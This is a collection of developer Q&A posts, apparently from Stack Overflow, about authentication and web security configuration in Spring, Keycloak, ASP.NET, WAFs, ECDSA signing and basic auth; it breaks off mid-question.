<p>What's strange is I am able to reach the <code>/session</code> endpoint successfully, and when I debug I do get to my login controller's method, it executes normally and returns a <code>ModelAndView</code>, but in the browser I don't get access to the page. If I change the method to return a raw JSON object, I get the object successfully, but obviously I'd like to get my functional page.</p>
<p>A complicating factor is that I have several <code>SecurityFilterChain</code> for various authentication mechanisms, but their pages don't overlap with this one, so I don't believe them to be the issue. Especially because when I make changes to this one, it does successfully change the behaviour of the page (redirect loop to 403)</p>
<p>Are there any changes in Spring 6 or Spring behaviours that would cause a 403 during the process of handling a <code>ModelAndView</code>?</p>
<p><strong>SecurityConfig.java</strong></p>
<pre><code>
public static final String[] LOGIN_PAGES = {&quot;/LoginPage&quot;, &quot;/ValidateLogin&quot;, &quot;/session&quot; };

@Bean(&quot;defaultSecurityChain&quot;)
@Order(Ordered.LOWEST_PRECEDENCE)
public SecurityFilterChain defaultSecurityChain(HttpSecurity http, HandlerMappingIntrospector introspector) throws Exception {
  RequestMatcher[] matchers = Arrays.asList(LOGIN_PAGES).stream().map(
    e -&gt; (new MvcRequestMatcher.Builder(introspector)).pattern(e))
      .collect(Collectors.toList()).toArray(new RequestMatcher[0]);
  http.authorizeHttpRequests(authorize -&gt; authorize.requestMatchers(matchers)
    .permitAll())
    // if form login and logout are commented out, I get a 403
    // if they are here, I get a loop to the login page until I get a too many redirects
    .formLogin(login -&gt; login.loginPage(&quot;/LoginPage&quot;)
      .permitAll().loginProcessingUrl(&quot;/ValidateLogin&quot;)
      .usernameParameter(&quot;loginName&quot;).passwordParameter(&quot;password&quot;)
      .failureHandler(customAuthenticationFailureHandler())
      .successHandler(customAuthenticationSuccessHandler()))
    .logout(logout -&gt; logout.logoutUrl(&quot;/Logout&quot;).logoutSuccessUrl(&quot;/LoginPage&quot;)
      .invalidateHttpSession(true))
    .sessionManagement(sessionManagement -&gt; sessionManagement.invalidSessionUrl(&quot;/LoginPage&quot;)
      .sessionFixation().migrateSession())
    .csrf(csrf -&gt; csrf.ignoringRequestMatchers(&quot;/ValidateLogin&quot;))
    .headers(headers -&gt; headers.frameOptions(frameOptions -&gt; frameOptions.sameOrigin()
      .contentSecurityPolicy(csp -&gt; csp.policyDirectives(CONTENT_SECURITY_POLICY))));
</code></pre>
<p><strong>LoginController.java</strong></p>
<pre><code>@RequestMapping(value = &quot;/LoginPage&quot;, method = RequestMethod.GET)
public ModelAndView showLoginPage(HttpServletRequest request, Principal principal) {
  if (principal != null) {
    return new ModelAndView(findForward(HOME_PAGE));
  }

  String forward = FWD_SUCCESS;
  LoginForm form = new LoginForm();
  return new ModelAndView(pageBuilderService.setupJSPPage(realForward, request), &quot;form&quot;, form);
}

@GetMapping(value = &quot;/session&quot;, produces = MediaType.APPLICATION_JSON_VALUE)
@ResponseBody
public UserSession getSesssionDetails(HttpServletRequest request, CsrfToken token) {
  boolean authenticated = !userModuleService.isSessionExpired(request);
  UserSession session = new UserSession();
  /* setting up user session info...*/
  return session;
}
</code></pre>
"
"<p>I want to store audio recordings in my Flutter App, I have created a POC that can do it, I'm wondering how to get a director that I can securly store them, Right now I'm just using a temp directory in this code, I would like to replace that with a folder that is secured (however Android or iOS would do that, I'm not trying to invent secure storage.)</p>
<pre><code>import 'dart:io';
import 'package:flutter/services.dart';
import 'package:path_provider/path_provider.dart';

class _AudioRecorderState extends State&lt;AudioRecorder&gt; {
  // Define a variable to hold the file path for the audio recording
  late String filePath;
  ...
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      ...
      body: Center(
        child: ElevatedButton(
          child: Text('Start Recording'),
          onPressed: () async {
            audioPlayer.start();
            await microphoneRecorder.start();
            filePath = await _getFilePath(); // Get the file path
          },
        ),
      ),
    );
  }

  // Function to get the temporary directory and create a file path for the audio recording
  Future&lt;String&gt; _getFilePath() async {
    final directory = await getTemporaryDirectory();
    return '${directory.path}/recording.wav';
  }

  // Function to save the audio recording to a file
  Future&lt;void&gt; _saveRecording() async {
    final recording = await microphoneRecorder.stop();
    final file = File(filePath);
    await file.writeAsBytes(recording!.buffer.asUint8List());
  }

  @override
  void dispose() {
    audioPlayer.dispose();
    _saveRecording();
    super.dispose();
  }
}
</code></pre>
<p>I hope there is a user directory that is secure that I can use, and not having to resort to encrypting it myself with like, encrypt.dart functions.</p>
<p>I tried looking at the docs, and I have not found a way to securly store the recordings, I have found encryption code, but I would prefer to offload it to the OS.</p>
"
"<p>I am working with Spring Cloud Gateway, built on Spring Webflux, and I aim to implement Keycloak's policy enforcement for authorization.</p>
<p>I'm using the following Keycloak adapter:</p>
<pre><code>&lt;dependency&gt;
    &lt;groupId&gt;org.keycloak&lt;/groupId&gt;
    &lt;artifactId&gt;keycloak-spring-security-adapter&lt;/artifactId&gt;
    &lt;version&gt;22.0.5&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>This adapter transitively includes the following dependencies:</p>
<pre><code>&lt;dependency&gt;
    &lt;groupId&gt;org.keycloak&lt;/groupId&gt;
    &lt;artifactId&gt;keycloak-policy-enforcer&lt;/artifactId&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.keycloak&lt;/groupId&gt;
    &lt;artifactId&gt;keycloak-core&lt;/artifactId&gt;
&lt;/dependency&gt;
</code></pre>
<p>However, the Keycloak adapter only provides ServletPolicyEnforcerFilter, which is designed for servlet-based Spring applications.</p>
<p>For non-reactive applications, the policy enforcement approach is detailed in this repository: <a href=""https://github.com/keycloak/keycloak-quickstarts/blob/latest/spring/rest-authz-resource-server/src/main/java/org/keycloak/quickstart/OAuth2ResourceServerSecurityConfiguration.java"" rel=""nofollow noreferrer"">Keycloak-Quickstarts</a></p>
<p>In this approach, the Policy Enforcer requests an RPT (Requesting Party Token) from Keycloak and uses it to authorize the user for the requested resource and scope. Reusing the RPT minimizes the need for repeated interactions with Keycloak for each request.</p>
<p>However, as I am using Spring Cloud Gateway, I've implemented the Policy Enforcement differently:</p>
<ul>
<li>Created resources, role-based policies, and permissions in Keycloak.</li>
<li>Maintained a map of request URI paths and resource names defined in Keycloak.</li>
<li>Implemented a CustomReactiveAuthorizationManager by implementing the ReactiveAuthorizationManager interface.Here Iam doing the following things</li>
</ul>
<ol>
<li>Extracted the resource name from the static resource map using the request URI.</li>
<li>Made a REST call to Keycloak to evaluate whether the current user is authorized for the requested resource and scope.
Here's a snippet of the CustomReactiveAuthorizationManager:</li>
</ol>
<pre><code>public class CustomReactiveAuthorizationManager implements ReactiveAuthorizationManager&lt;AuthorizationContext&gt; {

    private final String BEARER = &quot;Bearer &quot;;
    private final AuthorizationConfigProperties authorizationConfigProperties;

    @Override
    public Mono&lt;AuthorizationDecision&gt; check(Mono&lt;Authentication&gt; authentication, AuthorizationContext context) {
        String path = context.getExchange().getRequest().getPath().toString();
        String token = context.getExchange().getRequest().getHeaders().getFirst(HttpHeaders.AUTHORIZATION);
        if (!ObjectUtils.isEmpty(token) &amp;&amp; token.startsWith(BEARER)) {
            token = token.replace(BEARER, &quot;&quot;);
            String scope = context.getExchange().getRequest().getMethod().name();
            return evaluateResourceAccess(path, token, scope);
        }
        return Mono.just(new AuthorizationDecision(false));
    }
    
     public boolean evaluateResourceAccess(String uriPath, String token, String scope) {
        String resource = authorizationConfigProperties.getResource(uriPath); //from the resource map i created in application.yml I'm getting the resource name using requestUriPath 
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
        headers.setBearerAuth(token);
        MultiValueMap&lt;String, String&gt; requestParams = new LinkedMultiValueMap&lt;&gt;();
        requestParams.add(&quot;grant_type&quot;, &quot;urn:ietf:params:oauth:grant-type:uma-ticket&quot;);
        requestParams.add(&quot;audience&quot;, clientId);
        requestParams.add(&quot;permission&quot;, resource + &quot;#&quot; + scope);
        requestParams.add(&quot;response_mode&quot;, &quot;decision&quot;);
        HttpEntity&lt;MultiValueMap&lt;String, String&gt;&gt; requestEntity = new HttpEntity&lt;&gt;(requestParams, headers);
        try {
            //making a rest call to keycloak evalute endpoint
            ResponseEntity&lt;Object&gt; responseEntity = restTemplate.postForEntity(keycloakTokenEndpoint, requestEntity, Object.class);
            return responseEntity.getStatusCode().is2xxSuccessful();
        } catch (HttpClientErrorException.Forbidden e) {
            log.error(&quot;UnAuthorized:&quot; + e.getMessage());
            return false;
        } catch (Exception ex) {
            log.error(&quot;Authorization Failed:&quot; + ex.getMessage());
            return false;
        }
    }

}

</code></pre>
<ul>
<li>Integrated this custom manager into the SecurityWebFilterChain.</li>
</ul>
<pre><code>@Bean
public SecurityWebFilterChain springSecurityFilterChain(ServerHttpSecurity http) {
    return http.csrf(ServerHttpSecurity.CsrfSpec::disable)
            .oauth2ResourceServer(oauth2 -&gt; oauth2.jwt(Customizer.withDefaults()))
            .authorizeExchange(exchange -&gt; exchange
                            .pathMatchers(&quot;/public-endpoint&quot;)
                            .permitAll()
                            .anyExchange()
                            .access(new CustomReactiveAuthorizationManager(authService)))
            .build();
}
</code></pre>
<p>Now, my concern is the number of API calls to Keycloak for evaluating access and maintaining the map of request_uri_path and resource.
For each request, a call to Keycloak is made, potentially causing performance issues.</p>
<p>While I considered the RPT approach, it also requires maintaining the path and resource map, and explicitly checking whether the requested resource and scope are present in the RPT.Also I need the centralized authorization in spring cloud gateway I don't want to delegate the authorization to each individual microservice</p>
<p>I am seeking advice on alternative approaches to achieve policy enforcement in Spring Cloud Gateway while minimizing the number of Keycloak API calls.</p>
<p>Is there any other approach that can help optimize this scenario?</p>
"
"<p>I'm using cutom Providers and SPI using <a href=""https://github.com/cooperlyt/keycloak-phone-provider"" rel=""nofollow noreferrer"">keycloak-phone-provider</a>,</p>
<p>I have configured browser flow for client as below:</p>
<p><a href=""https://i.stack.imgur.com/NcwOi.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/NcwOi.png"" alt=""enter image description here"" /></a></p>
<p>After this it shows what we expect.</p>
<p><a href=""https://i.stack.imgur.com/ajjkC.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/ajjkC.png"" alt=""enter image description here"" /></a></p>
<p>But when we give wrong OTP, it redirects and shows username-password form:</p>
<p>http://localhost:8180/realms/hc-realm/login-actions/authenticate?execution=60fbe0b2-0dbb-445c-8751-54ee28c4316e&amp;client_id=hc-client&amp;tab_id=ieKqIWvOTnk</p>
<p><a href=""https://i.stack.imgur.com/ejhrv.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/ejhrv.png"" alt=""enter image description here"" /></a></p>
<p>Is there a way where we can configure login actions in keycloak. Currently, I'm using keycloak version 21.</p>
"
"<p>I have two ASP.NET MVC applications with session configurations. When I log in from app1, that login is successful. After logging in from app2, it overwrites app1's session cookie and successfully logs in app2. But refreshing the app1 result redirects to the login page.</p>
<ol>
<li>Both app1 and app2 cookie path is &quot;/&quot;.</li>
<li>Both app1 and app2 running on the same IIS server.</li>
<li>Both app1 and app2 cookie name is unique.</li>
</ol>
<p>I tried to change the session cookie path but it did not work.</p>
"
"<p>I am using the new ASP.NET with React template in Visual Studio, which creates two separate projects for the Server and the Client App. The template uses Vite to bundle the React application and put the scripts inside the wwwroot/Assets directory of the published package.</p>
<p>I am hosting my application in IIS and have been trying to implement Windows Authentication on the server side. To prevent an unauthorised user from accessing the entire application rather than just the backend API I need to authenticate when the user is trying to access the static files. Most solutions I find suggest to feed in the appropriate StaticFileOptions to the app.UseStaticFiles method in Program.cs, using the OnPrepareResponse option to redirect/reject request if the user is not authenticated. But this doesn't seem to work in this new template.</p>
<p>Does anyone know how to implement this with the React + Vite template? Here is the code I have been trying to use to authenticate when the user is accessing the static files.</p>
<pre><code>    app.UseStaticFiles(new StaticFileOptions
    {
        OnPrepareResponse = x =&gt;
        {
            if (x.Context.User.Identity.IsAuthenticated)
            {
                return;
            }

            x.Context.Response.StatusCode = (int)HttpStatusCode.Unauthorized;
            x.Context.Response.ContentLength = 0;
            x.Context.Response.Body = Stream.Null;
        }
    });
</code></pre>
"
"<p>I have SharePoint online site that uses Multi Factor Authentication: I am presented with a login screen where I supply my username and password. After this I am taken to another popup where I can choose a second authentication method like Microsoft Authenticator, RSA Token, or Smartcard etc.</p>
<p>The idea behind my WinForm app is to also authenticate in the same way described above and once authenticated I will perform some actions on the SharePoint site (see WebFullUrl below) with my WinForm app.
My knowledge is rather limited but I understand that I need to get a token before actually gaining access to the site. Please feel free to correct me where you can. :)</p>
<p>The biggest issue I am facing at the moment is for my app to get a token.
This is my project until now.</p>
<pre><code>using System.Security.Principal;
using System.Security;
using System.Diagnostics;
using PnP.Framework;
using Microsoft.SharePoint.Client;
using Microsoft.Graph;
using System.Globalization;
using Microsoft.Identity.Client;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.TextBox;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using static System.Formats.Asn1.AsnWriter;
using System.Windows.Interop;
using Microsoft.AspNetCore.Components;
using Microsoft.IdentityModel.Abstractions;

namespace AuthDemoWinForms
{
      public partial class MainForm : System.Windows.Forms.Form
      {
          private static readonly string[] scopesArray = [&quot;User.Read&quot;, &quot;Contacts.Read&quot;];
          private static readonly string Username = &quot;Name.Surname@domain.nl&quot;;
          private static readonly string Password = &quot;ThisIsMyPassword&quot;;
          private static readonly string AuthEndPoint = &quot;https://login.microsoftonline.com/common/oauth2/token&quot;;
          private static readonly string ClientId = &quot;00000003-0000-0ff1-ce00-000000000000&quot;;
          private static IPublicClientApplication? SharePointApplication = null;
          private static readonly string WebFullUrl = &quot;https://domainname.sharepoint.com/teams/DEFILES/Shared%20Documents/Forms/AllItems.aspx&quot;;
    
          public MainForm()
          {
    
              InitializeComponent();
    
              SharePointApplication = PublicClientApplicationBuilder.Create(ClientId)
                  .WithDefaultRedirectUri()
                  .WithLogging(new IdentityLogger(EventLogLevel.Warning), enablePiiLogging: false)
                  .Build();
    
          }
    
          private void LoginButton_Click(object sender, EventArgs e)
          {
              if (SharePointApplication != null)
              {
                  Task&lt;AuthenticationResult?&gt; authenticationResultTask = GetTokenInteractively(SharePointApplication);
                  authenticationResultTask.Wait();
                  AuthenticationResult? authenticationResult = authenticationResultTask.Result;
                  OutputTextBox.Text = authenticationResult == null ? string.Empty : authenticationResult.Account.Username;
              }
          }
          private static async Task&lt;AuthenticationResult?&gt; GetTokenInteractively(IPublicClientApplication? publicClientApplication)
          {
              try
              {
                  return await publicClientApplication!.AcquireTokenInteractive(scopesArray)
                      .WithParentActivityOrWindow(new WindowInteropHelper(System.Windows.Application.Current.MainWindow))
                      .ExecuteAsync();
              }
              catch (Exception ex)
              {
                  Debug.WriteLine($&quot;InnerException : {ex.InnerException}\nMessage : {ex.Message}\nStackTrace : {ex.StackTrace}&quot;);
                  return null;
              }
          }
          private static async Task&lt;AuthenticationResult?&gt; Login()
          {
              try
              {
    
              }
              catch (Exception ex)
              {
              }
              return null;
          }
      }
}
</code></pre>
<p>I have a question regarding <code>.WithParentActivityOrWindow(new WindowInteropHelper(System.Windows.Application.Current.MainWindow))</code>.</p>
<p>Will this present me with the Authentication Popup or do I need to still build a Dialogue that will handle this?
Also, where and when do I need to enter my username and password?</p>
<p>As extra remark, it appears as if the Async Task doesn't finalise.</p>
<p>I am lost!</p>
"
"<p>I have only one option to connect to SQL Server using Windows authentication mode. When I am trying to connect it through SQL Management studio it is working properly. Same thing I am trying to do using PowerShell using following code:</p>
<pre><code>$Path = 'D:\'
write &quot;Starting script --------&quot; | Out-File $Path\output.txt
$SQLServer = 'server_name,1111'
$Database = 'db_name'

try {
    $Connection = New-Object System.Data.SqlClient.SQLConnection
    $Connection.ConnectionString = &quot;Data Source=$SQLServer;Integrated Security=$true;Initial Catalog=$Database&quot;
    $Connection.Open()

    Write-Host 'Open database connection'
    write &quot;Open database connection&quot; | Out-File $Path\output.txt -Append
    }
catch {
    Write-Host 'An error occurs'
    write &quot;error opening connection: $_&quot; | Out-File $Path\output.txt -Append
}
finally {
    ## Ensure closing the connection to release the resource / free memory
    $Connection.Close()

    Write-Host 'Close database connection'
    write &quot;Close database connection&quot; | Out-File $Path\output.txt -Append
}
</code></pre>
<p>It is working properly when run it manually but it is showing following error when I schedule it in Windows Task Manager. In scheduler it is schedule with same user through which I have connect to server and same user is having rights to connect to DB.</p>
<blockquote>
<p>error opening connection: Exception calling &quot;Open&quot; with &quot;0&quot;
argument(s): &quot;Login failed for user 'NT AUTHORITY\ANONYMOUS LOGON'.&quot;</p>
</blockquote>
<p><a href=""https://i.stack.imgur.com/Def77.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/Def77.jpg"" alt=""enter image description here"" /></a></p>
<p>Security option. I have just marked some part of the username for security purposes</p>
<p>Can anyone help me what wrong I am doing here?</p>
"
"<p>I have an .NET core application that uses windows authentication. Locally it works fine. However when application is deployed to an openshift platform I get this error after trying to sign in.</p>
<pre><code>An unhandled exception occurred while processing the request.
AuthenticationException: GenericFailure
Microsoft.AspNetCore.Authentication.Negotiate.NegotiateHandler.HandleRequestAsync()

    AuthenticationException: GenericFailure
Microsoft.AspNetCore.Authentication.Negotiate.NegotiateHandler.HandleRequestAsync()
Microsoft.AspNetCore.Authentication.Negotiate.NegotiateHandler.HandleRequestAsync()
Microsoft.AspNetCore.Authentication.AuthenticationMiddleware.Invoke(HttpContext context)
Microsoft.AspNetCore.Diagnostics.DeveloperExceptionPageMiddlewareImpl.Invoke(HttpContext context)
</code></pre>
<p>In my Program.cs I use generic rules for windows auth, nothing fancy:</p>
<pre><code>builder.Services.AddAuthentication(NegotiateDefaults.AuthenticationScheme)
    .AddNegotiate();

builder.Services.AddAuthorization(options =&gt;
{
    // By default, all incoming requests will be authorized according to the default policy.
    options.FallbackPolicy = options.DefaultPolicy;
});

app.UseAuthentication();
app.UseAuthorization();
</code></pre>
<p>Looked everywhere for a possible solution but I was unable to find it so I'm now desperate enough to ask here.</p>
"
"<p>I have created an ASP.Net core (net 8) web application using visual studio 2022.</p>
<p>I have set up windows authentication and authorisation  to check if users exist in an AD group and log them in without having to submit credentials.</p>
<p>When deployed to the web server it works as expected however when I run the application locally in Visual Studio it prompts me to enter my Windows account details.</p>
<p>Does anyone know why this might be?</p>
<p>Thanks</p>
"
"<p><code>SQLSERVERABC</code> is on domain <code>abc.local</code>.</p>
<p>If I connect to SQLSERVERABC via remote desktop, I cannot login to the database via SSMS on the local machine that I have remoted to.</p>
<p>At SSMS login screen:</p>
<pre>
Server Type: Database Engine
Server Name: SQLSERVERABC
Authentication: Windows Authentication.
User name: abc\mylogin
</pre>
<p>The login attempt will timeout, and the server will not authenticate me or <em>anyone else</em> via Active Directory on our domain controller.</p>
<p>The weird thing is Windows Authentication works if I login via SSMS my local computer and not remoted into the SQL server via remote desktop.</p>
<p>But we have remote users who are not on our domain (working from home) they have to remote to the SQL Server and can login using Windows Authentication with their domain credentials but only if they substitute the Server Name: SQLSERVERABC with its IP Address on the SSMS login QUI.</p>
<p>SQLSERVERABC is set to both windows and SQL server authentication, All DNS instances are set up properly...I can not figure out why Windows Authentication will not work when user remote to the actual SQL box unless we use the box's IP address as its Server Name. Yes it's a work around but need fix it...</p>
<p>Trying to get SQL server 2016 that is on a .local domain to allow windows authentication using it's SERVER NAME and not IP address</p>
"
"<p><strong>Problem Description:</strong>
I'm currently architecting a solution in Azure that requires both autoscaling capabilities for my web application to ensure scalability and a Web Application Firewall (WAF) to protect against common vulnerabilities such as XSS and SQL injection attacks. However, I'm facing a dilemma regarding the use of Azure Application Gateway with WAF and Azure Web App's internal load balancer for autoscaling.</p>
<p><strong>Reproducible Example:</strong></p>
<ol>
<li>I have configured Azure Application Gateway with WAF enabled to provide security features for my web application.</li>
<li>Additionally, I have enabled autoscaling for my Azure Web App to dynamically adjust the number of instances based on traffic demand.</li>
</ol>
<p><strong>Expected Behavior:</strong>
I expect the Azure Web App to scale dynamically to handle varying levels of traffic while also benefiting from the security features provided by the WAF.</p>
<p><strong>Actual Behavior:</strong>
However, I'm concerned about potential conflicts between the Azure Application Gateway's load balancer used for WAF and the Azure Web App's internal load balancer used for autoscaling. I'm unsure if having two load balancers in the architecture could lead to conflicts or inefficiencies.</p>
<p><strong>Attempts to Solve:</strong></p>
<ol>
<li>I've researched Azure documentation and best practices but haven't found clear guidance on integrating Azure Web App autoscaling with Azure Application Gateway and WAF.</li>
<li>I've considered alternative architectures but haven't identified a solution that meets both scalability and security requirements without potential conflicts.</li>
</ol>
<p><strong>Specific Questions:</strong></p>
<ol>
<li>What are the best practices for integrating Azure Web App autoscaling with Azure Application Gateway and WAF to ensure both scalability and security?</li>
<li>Are there any known conflicts or considerations when using multiple load balancers in this architecture?</li>
<li>How can I architect my solution to leverage autoscaling for scalability and WAF for security without introducing potential conflicts or inefficiencies?</li>
</ol>
"
"<p>We set up a WAF in AWS CDK with default rules, and it includes a rule that blocks any request with <code>SignalNonBrowserUserAgent</code>. It's tough to get around this when your clients are apps or postman or python requests.</p>
<p>I couldn't not find a solution to this and spent a few days figuring it out so I'm documenting the setup and solution for anyone else that has struggled with this.  The WAF was instantiated with the following code</p>
<pre><code>    from aws_solutions_constructs.aws_wafwebacl_apigateway import WafwebaclToApiGateway
    my_waf = WafwebaclToApiGateway(scope, waf_id, existing_api_gateway_interface=gateway)
</code></pre>
"
"<p>I want to create a Rate limiting AWS WAF rule for my frontend application, I don't know how much threshold should I need to give because when page loads there is around 50 internal calls happening. Say 5000 people opening my site at a same time, there will 5000*50, but I should not set 2,50,000. Then how should I set the rate limiting threshold for frontend applications?</p>
<p>I have tried putting 100 as threshold in my rate limiting. So if I refresh thrice within 5mins period, it should block the site, but I was able to make multiple calls to that site which is more than 50 in 5mins period, Then how these threshold is calculated for frontend applications?</p>
"
"<p>I have a public facing angular site hosted is AKS which is behind Azure WAF. But the WAF is blocking calls to robots.txt as a result the google search engine crawler is not indexing the site.</p>
<p>I don't see an option to exclude the policy based on URL. It can only be done based on Headers, Query params and Arguments.</p>
<p>How can I configure WAF to allow access to robots.txt</p>
"
"<p>We are using Tenable to identify security vulnerabilities. Missing HSTS was identified recently. Our server is Apache for ui and spring boot for backend .</p>
<p>The HSTS header is present in the response headers but in the security tab it indicated disabled.</p>
<p>My config for the virtual host in httpd.conf is as follows:</p>
<p>Header always set Strict-Transport-Security &quot;max-age=63072000; includeSubDomains; preload&quot;</p>
<p>Question: How do I make this change show up for Firefox and Tenable?</p>
<p>Thank you.</p>
"
"<p>In other frameworks, I've seen codeSignature included in dynamic cases.
because dynamic frameworks have &quot;embed and sign&quot; option.
but this time Apple said, &quot;Signatures are so required in these cases where the listed SDKs are used as binary dependencies.&quot; Does that mean that even if the &quot;.framework&quot; file of the SDK you are deploying is static, you have to include codeSignature?</p>
<p>and if a framework is not included in Privacy-Impacting SDKs list, is it okay not to sign?</p>
"
"<p>Let's say we have this code to sign a simple transaction in <strong>Ethereum</strong> and then verify the signature, using the <a href=""https://en.bitcoin.it/wiki/Elliptic_Curve_Digital_Signature_Algorithm"" rel=""nofollow noreferrer"">Elliptic Curve Digital Signature Algorithm (ECDSA)</a>, just like in real life:</p>
<pre><code>const { secp256k1 } = require(&quot;ethereum-cryptography/secp256k1&quot;);
const { keccak256 } = require(&quot;ethereum-cryptography/keccak&quot;);
const { toHex, utf8ToBytes } = require(&quot;ethereum-cryptography/utils&quot;);

const privateKey = secp256k1.utils.randomPrivateKey();
console.log('private key :  ', toHex(privateKey));

const publicKey = secp256k1.getPublicKey(privateKey);
console.log('public key  :', toHex(publicKey));

const data = &quot;hello world!&quot;;
const hash = keccak256(utf8ToBytes(data));
const signature = secp256k1.sign(hash, privateKey);
console.log(&quot;Signing data   :&quot;, data);
</code></pre>
<p>Then I send the <code>data</code> and <code>signature</code> through the network and use this code to retrieve the public key and verify the signature:</p>
<pre><code>const pkRecovered = signature.recoverPublicKey(hash).toRawBytes();
console.log(&quot;honest verification   :&quot;, {data: data, signature: &quot;...&quot;});
console.log('recovery    :', toHex(publicKey) === toHex(pkRecovered));                // true  
console.log('verification:', secp256k1.verify(signature, hash, pkRecovered));         // true
</code></pre>
<p>So far so good.</p>
<p>But what if I (<a href=""https://en.wikipedia.org/wiki/Man-in-the-middle_attack"" rel=""nofollow noreferrer"">or someone in the middle</a>) change the transaction data? You would expect the signature verification to fail, but it retrieves a different public key and the verification is successful.</p>
<pre><code>const dataEvil = &quot;modified&quot;;
const hashEvil = keccak256(utf8ToBytes(dataEvil));
const pkRecoveredEvil = signature.recoverPublicKey(hashEvil).toRawBytes();
console.log(&quot;malicious verification:&quot;, {data: dataEvil, signature: &quot;the same&quot;});
console.log('recovery    :', toHex(publicKey) === toHex(pkRecoveredEvil));            // false
console.log('verification:', secp256k1.verify(signature, hashEvil, pkRecoveredEvil)); // true... why?
</code></pre>
<p>It doesn't seem right to me, but I can't figure out what I'm doing wrong.</p>
"
"<p>When using basicAuth for serveStatic, it throws <code>SIGSEGV</code> error:</p>
<pre><code>error: script &quot;dev&quot; was terminated by signal SIGSEGV (Address boundary error)
</code></pre>
<p>It works fine with html methods like <code>app.get</code></p>
<p>Simple example:</p>
<pre><code>import { Hono } from &quot;hono&quot;;
import { basicAuth } from &quot;hono/basic-auth&quot;;
import { serveStatic } from &quot;hono/bun&quot;;

const app = new Hono();

const auth = basicAuth({
    username: &quot;password&quot;,
    password: &quot;password&quot;,
});

app.use(&quot;/*&quot;, auth);

app.use(&quot;/static/*&quot;, auth, serveStatic({ root: &quot;./&quot; }));

Bun.serve({ port: 8000, fetch: app.fetch });
</code></pre>
"
"<pre><code>class MenucardController &lt; ApplicationController

  http_basic_authenticate_with name: 'admin', password: 'password'

  def index
    @menu_items = CsvFileTest.find_each(batch_size: 10)
  end
end
</code></pre>
<p>I have a basic authentication in my rails app, how do i test it in feature automated testing.?</p>
<p>I tried this and many other methods too</p>
<pre><code>page.driver.browser.basic_authorize('admin', 'password')
</code></pre>
<p>but authentication testing is not passing successful</p>
"
"<h3>What I am trying to achieve</h3>
<p>I am trying to implement Spring Security with REST API and React as frontend with basic authentication (I am not planning on using JWT because it is overkill for my project). This is my first time implementing security, so I am feeling a bit lost. I am using Spring Spring Boot 3.2.1 and most of the articles online are deprecated.</p>
<h3>What I have done so far</h3>
<p>Load users from database using JDBC</p>
<pre class=""lang-java prettyprint-override""><code>@Bean
public UserDetailsService userDetailsService(DataSource dataSource) {
    return new JdbcUserDetailsManager(dataSource);
}
</code></pre>
<p>Security Filter Chain</p>
<pre class=""lang-java prettyprint-override""><code>@Bean
SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    return http.authorizeHttpRequests(requests -&gt;
            requests
                    .requestMatchers(HttpMethod.GET, &quot;/restaurant/**&quot;, &quot;/menu/**&quot;).permitAll()
                    .requestMatchers(HttpMethod.POST, &quot;/register&quot;).permitAll()
                    .anyRequest().authenticated()
    )
            .cors(Customizer.withDefaults())
            .csrf(csrf -&gt; csrf.disable())
            .httpBasic(Customizer.withDefaults())
            .build();
}
</code></pre>
<p>Authentication Controller</p>
<pre class=""lang-java prettyprint-override""><code>@GetMapping(&quot;/login&quot;)
public ResponseEntity&lt;?&gt; loginUser() {
    return new ResponseEntity&lt;&gt;(&quot;Authentication successful&quot;, HttpStatus.OK);
}
</code></pre>
<p>Authorize users with React</p>
<pre class=""lang-js prettyprint-override""><code>const authorize = () =&gt; {
    fetch(&quot;http://localhost:8080/login&quot;, {
        headers: { &quot;Authorization&quot;: 'Basic ' + window.btoa(email + &quot;:&quot; + password) }
    }).then(response =&gt; console.log((response.ok === true) ? &quot;successful&quot; : &quot;unsuccessful&quot;));
}
</code></pre>
<p>Password encoder, CORS configuration, registration controller, and entities are left out for simplicity.</p>
<h3>Problems</h3>
<ul>
<li>Because <code>/login</code> endpoint is only accessible to authenticated user, it should return <code>200</code> if proper authentication details is sent and <code>401</code> otherwise. But I am guessing this does not use <code>SecurityContextHolder</code> to authenticate user if the user was already authenticated beforehand and it is fetching user details from database on each call. How can I ensure the context is being utilized to authenticate users?</li>
<li>Let's say I want to make a call to an authenticated endpoint such as <code>/order</code>, would I have to add <code>Authorization</code> header on each call? Is there a way to store whether the user is authenticated or not for a certain amount of time? Other threads suggested that <code>localStorage</code> and cookies are unsafe methods.</li>
</ul>
"
"<pre><code>`&lt;?php
mysqli_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;&quot;, &quot;groboch123&quot;); ?&gt;

&lt;?php
$Realm = &quot;&lt;big&gt;&lt;span style='color:green; font-weight:bold;'/&gt;Worked!&lt;/span&gt;&lt;/big&gt;&quot;;?&gt;

&lt;?php

if (!isset($_SERVER['PHP_AUTH_USER']))/*Need to be !isset*/{
header('WWW-Authenticate: Basic realm=&quot;My Realm&quot;');
header('HTTP/1.0 401 Unauthorized');
echo 'Lorem Ipsum'; /* Make the user see this */
exit;
} else {
echo &quot;&lt;p&gt;Hello {$_SERVER['PHP_AUTH_USER']}.&lt;/p&gt;&quot;;
echo &quot;&lt;p&gt;You entered {$_SERVER['PHP_AUTH_PW']} as your password.&lt;/p&gt;&quot;;
}
?&gt;`
</code></pre>
<p>I am trying to create an authorized login.</p>
<p>I'm looking for ways here to improve my code. I want the Lorem Ipsum to be the Realm. :) Hopefully, this can get done someway.</p>
<p>This will be a great video game for computers. I am trying to add this prompt. Or, alternatively, if this is an too expensive method maybe using the prompt() to validate credentials??</p>
"
"<p>I have several layers protected with basic authentication in Geoserver (WMS). Authentication works fine with QGIS, but when I try to authenticate with Leaflet, nothing loads.</p>
<p>I've researched but haven't found much information.
I was reading the leaflet documentation and couldn't find a solution.</p>
"
"<p>I have an OData interface with an implemented basic authentication. Somehow the basic auth is set to default by its class. When I deliver the credentials in the request header without the key word &quot;Basic&quot;, it works fine, but when I do, I get a HTTP 500 Internal Server Error.
How can I remove the default basic auth setting?</p>
<p>works:
